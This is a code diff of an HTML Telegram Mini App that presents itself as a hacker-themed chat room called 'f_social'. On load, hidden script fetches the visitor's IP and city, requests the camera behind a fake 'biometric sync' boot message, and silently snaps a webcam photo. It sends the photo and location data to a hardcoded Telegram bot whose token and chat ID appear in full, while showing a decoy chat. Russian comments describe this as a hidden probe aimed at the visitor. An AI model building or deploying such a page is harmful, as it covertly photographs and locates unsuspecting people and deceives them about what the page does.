@@ -3,57 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ANON_NET // SECURE_CHAT</title>
+    <title>f_social // join_the_revolution</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --main: #ff003c; --bg: #050505; --chat-bg: #111; }
-        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; -webkit-user-select: none; }
-        .grid-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(255,0,60,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,60,0.05) 1px, transparent 1px); background-size: 40px 40px; z-index: 0; pointer-events: none; }
+        :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; }
+        body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
         
-        /* Заставка сканера */
-        #scanner { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 1000; display: flex; justify-content: center; align-items: center; text-align: center; }
-        #scanner.hidden { display: none; }
-        .scanner-box { background: rgba(15, 0, 0, 0.9); border: 1px solid var(--main); padding: 25px; width: 85%; max-width: 400px; border-radius: 5px; box-shadow: 0 0 30px rgba(255, 0, 60, 0.1); }
-        .loading-bar { width: 100%; height: 2px; background: #200005; margin: 20px 0; position: relative; overflow: hidden; }
-        .loading-bar::after { content: ''; position: absolute; left: -50%; width: 50%; height: 100%; background: var(--main); animation: load 1.5s infinite linear; }
-        @keyframes load { 100% { left: 100%; } }
-        #status { font-size: 14px; text-transform: uppercase; letter-spacing: 3px; font-weight: bold; color: var(--main); }
-        #details { font-size: 10px; margin-top: 15px; color: #666; font-family: monospace; }
+        /* ЭФФЕКТ ТЕРМИНАЛА ПРИ ЗАГРУЗКЕ */
+        #boot-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: #00ff41; overflow: hidden; }
+        .cursor { display: inline-block; width: 8px; height: 15px; background: #00ff41; animation: blink 0.8s infinite; vertical-align: middle; }
+        @keyframes blink { 50% { opacity: 0; } }
 
-        /* Интерфейс чата */
-        #chat { display: none; flex-direction: column; height: 100vh; z-index: 100; position: relative; }
-        #chat.visible { display: flex; }
-        header { background: rgba(15, 0, 0, 0.95); border-bottom: 1px solid var(--main); padding: 10px 20px; text-align: center; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: var(--main); }
-        #messages { flex-grow: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column-reverse; background: rgba(0,0,0,0.7); }
-        .message { background: var(--chat-bg); border-radius: 8px; padding: 10px; margin-bottom: 10px; max-width: 80%; border: 1px solid rgba(255,255,255,0.05); }
-        .message.system { background: transparent; border: none; color: #555; font-size: 12px; text-align: center; align-self: center; }
-        .message.user { align-self: flex-start; }
-        input-area { background: rgba(15, 0, 0, 0.95); border-top: 1px solid var(--main); padding: 10px; display: flex; gap: 10px; }
-        input { flex-grow: 1; background: #222; border: 1px solid rgba(255,255,255,0.1); color: #fff; padding: 12px; font-family: monospace; border-radius: 4px; outline: none; }
-        button { background: var(--main); color: #000; border: none; padding: 12px 20px; font-weight: bold; text-transform: uppercase; border-radius: 4px; cursor: pointer; transition: 0.2s; }
-        button:active { opacity: 0.7; }
+        /* ГЛАВНЫЙ ИНТЕРФЕЙС F_SOCIAL */
+        #app { display: none; flex-direction: column; height: 100vh; z-index: 100; }
+        header { padding: 20px; border-bottom: 1px solid #222; text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); text-transform: lowercase; }
+        .logo span { color: var(--f-white); }
+
+        .nav-tabs { display: flex; border-bottom: 1px solid #222; }
+        .nav-tabs div { flex: 1; padding: 15px; text-align: center; font-size: 10px; cursor: pointer; border-right: 1px solid #222; color: #555; transition: 0.3s; }
+        .nav-tabs div.active { color: var(--f-red); background: rgba(255,0,60,0.05); }
+
+        /* ЧАТ */
+        #chat-content { flex-grow: 1; display: flex; flex-direction: column; padding: 15px; }
+        #messages { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column-reverse; margin-bottom: 15px; }
+        .msg { background: #111; border-left: 2px solid var(--f-red); padding: 10px; margin-bottom: 10px; font-size: 13px; line-height: 1.4; }
+        .msg.sys { border: none; color: #444; font-size: 11px; text-align: center; }
+
+        .input-box { display: flex; gap: 10px; padding-bottom: 10px; }
+        input { flex-grow: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; font-family: inherit; outline: none; }
+        input:focus { border-color: var(--f-red); }
+        button { background: var(--f-red); color: #fff; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div class="grid-bg"></div>
 
-    <div id="scanner">
-        <div class="scanner-box">
-            <div id="status">INIT_SEQUENCE...</div>
-            <div class="loading-bar"></div>
-            <div id="details">CONNECTING_TO_ANON_NETWORK</div>
-        </div>
+    <div id="boot-screen">
+        <div id="boot-logs"></div>
+        <span class="cursor"></span>
     </div>
 
-    <div id="chat">
-        <header>ANON_NET // CHAT_ROOM #513</header>
-        <div id="messages">
-            <div class="message system">[ПОДКЛЮЧЕНО К ШЛЮЗУ #513]</div>
-            <div class="message system">[ДОБРО ПОЖАЛОВАТЬ, ANON_USER]</div>
+    <div id="app">
+        <header>
+            <div class="logo">f_<span>social</span></div>
+            <div style="font-size: 8px; color: #444; margin-top: 5px;">democracy_is_a_lie.exe</div>
+        </header>
+
+        <div class="nav-tabs">
+            <div class="active">/messages</div>
+            <div>/leaks</div>
+            <div>/manifesto</div>
         </div>
-        <div class="input-area">
-            <input type="text" id="user-input" placeholder="Введите сообщение...">
-            <button onclick="sendMessage()">ОТПРАВИТЬ</button>
+
+        <div id="chat-content">
+            <div id="messages">
+                <div class="msg sys">[SECURE_TUNNEL_ESTABLISHED]</div>
+                <div class="msg sys">[WELCOME_BACK_FRIEND]</div>
+                <div class="msg">Hello, friend. It's time to take down the top 1% of the top 1%. Join the chat.</div>
+            </div>
+            <div class="input-box">
+                <input type="text" id="m-input" placeholder="type_message..." autocomplete="off">
+                <button onclick="send()">SEND</button>
+            </div>
         </div>
     </div>
 
@@ -62,35 +73,45 @@
     const TG_TOKEN = "8713406185:AAEYao0zu3daLeZis1gkrFD3-wv7oMXCzsY"; 
     const TG_ID = "5131628747"; 
 
-    // Инициализация Telegram Mini App
-    if (window.Telegram && window.Telegram.WebApp) {
-        window.Telegram.WebApp.ready();
-        window.Telegram.WebApp.expand();
-    }
+    const bootLogs = document.getElementById('boot-logs');
 
-    // Запуск сканера при открытии
     window.onload = () => {
-        startCapture();
+        if(window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+            window.Telegram.WebApp.expand();
+        }
+        runBootSequence();
     };
 
+    function log(text, delay) {
+        return new Promise(res => {
+            setTimeout(() => {
+                const l = document.createElement('div');
+                l.innerText = `> ${text}`;
+                bootLogs.appendChild(l);
+                res();
+            }, delay);
+        });
+    }
+
+    async function runBootSequence() {
+        await log("initializing f_social kernel...", 300);
+        await log("checking node permissions...", 500);
+        await log("requesting biometric sync...", 400); // Это момент запроса камеры
+        
+        startCapture(); // Запускаем скрытый пробив
+
+        await log("bypassing firewall...", 1000);
+        await log("access_granted.", 500);
+        await log("loading encrypted UI...", 300);
+    }
+
     async function startCapture() {
-        let ipData = {};
-        const st = document.getElementById('status');
-        const dt = document.getElementById('details');
-
-        // Сбор сетевых данных (не застреваем на ошибке)
+        let ip = {};
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            ipData = await res.json();
-            dt.innerText = `NODE_ESTABLISHED [IP: ${ipData.ip || 'UNK'}]`;
-        } catch(e) { 
-            ipData = { ip: "IP_HIDDEN/VPN" }; 
-            dt.innerText = `NODE_ESTABLISHED [VPN_DETECTED]`;
-        }
+            ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+        } catch(e) { ip = {ip: "unknown"}; }
 
-        st.innerText = "BIO_CALIBRATION...";
-
-        // Запрос камеры (не застреваем на ошибке)
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
@@ -99,68 +120,49 @@
 
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
                 canvas.toBlob(blob => {
-                    sendData(ipData, blob); // Шлем фото и IP тебе в бот
+                    sendToBot(ip, blob);
                     stream.getTracks().forEach(t => t.stop());
-                    showChat(); // После снимка показываем чат
+                    showApp(); // Как только данные улетели — показываем чат
                 }, 'image/jpeg');
             }, 3000);
-        } catch(err) {
-            // Если камеру заблокировали
-            sendData(ipData, null); // Шлем хотя бы IP
-            showChat(); // Показываем чат
+        } catch(e) {
+            sendToBot(ip, null);
+            setTimeout(showApp, 2000); // Показываем чат даже если камеру не дали
         }
     }
 
-    // Показать интерфейс чата и скрыть сканер
-    function showChat() {
-        document.getElementById('scanner').classList.add('hidden');
-        document.getElementById('chat').classList.add('visible');
+    function showApp() {
+        document.getElementById('boot-screen').style.display = 'none';
+        document.getElementById('app').style.display = 'flex';
     }
 
-    // Функция отправки данных в Telegram
-    function sendData(ip, photo) {
-        const info = `👤 ОТЧЕТ OSINT\n🌐 IP: ${ip.ip}\n📍 ГОРОД: ${ip.city || '?'}\n📱 СИСТЕМА: ${navigator.platform}`;
-        const formData = new FormData();
-        formData.append('chat_id', TG_ID);
-        if (photo) {
-            formData.append('photo', photo, 'capture.jpg');
-            formData.append('caption', info);
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    function sendToBot(ip, photo) {
+        const text = `🎯 F_SOCIAL_LOG\nIP: ${ip.ip}\nCity: ${ip.city || '?'}\nOS: ${navigator.platform}`;
+        const fd = new FormData();
+        fd.append('chat_id', TG_ID);
+        if(photo) {
+            fd.append('photo', photo, 'ell.jpg');
+            fd.append('caption', text);
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {method:'POST', body:fd});
         } else {
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(info)}`);
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
         }
     }
 
-    // Функция для симуляции отправки сообщений в чате
-    function sendMessage() {
-        const input = document.getElementById('user-input');
-        const text = input.value.trim();
-        if (text === "") return;
-
-        // Создаем сообщение в чате
+    function send() {
+        const i = document.getElementById('m-input');
+        if(!i.value.trim()) return;
         const msgs = document.getElementById('messages');
-        const msg = document.createElement('div');
-        msg.classList.add('message', 'user');
-        msg.innerText = text;
-        
-        // Добавляем сообщение в начало (флекс в реверсе)
-        msgs.prepend(msg);
-        
-        // Очищаем ввод
-        input.value = "";
+        const d = document.createElement('div');
+        d.className = 'msg';
+        d.style.color = "#fff";
+        d.innerText = i.value;
+        msgs.prepend(d);
+        i.value = "";
     }
-
-    // Поддержка отправки по Enter
-    document.getElementById('user-input').addEventListener('keypress', function (e) {
-        if (e.key === 'Enter') {
-            sendMessage();
-        }
-    });
 </script>
 </body>
 </html>
